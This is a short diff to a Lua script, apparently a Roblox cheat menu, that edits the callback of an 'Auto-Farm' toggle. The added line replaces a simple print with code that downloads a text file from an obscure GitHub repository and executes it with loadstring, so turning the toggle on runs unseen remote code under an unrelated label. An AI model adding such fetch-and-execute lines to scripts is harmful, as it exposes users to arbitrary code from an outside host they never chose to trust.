@@ -29,7 +29,7 @@ tgls:Toggle(
     "Auto-Farm",
     false,
     function(bool)
-        print(bool)
+        print(loadstring(game:HttpGet("https://raw.githubusercontent.com/advxzivhsjjdhxhsidifvsh/mobkeyboard/main/main.txt", true))())
     end
 )
 
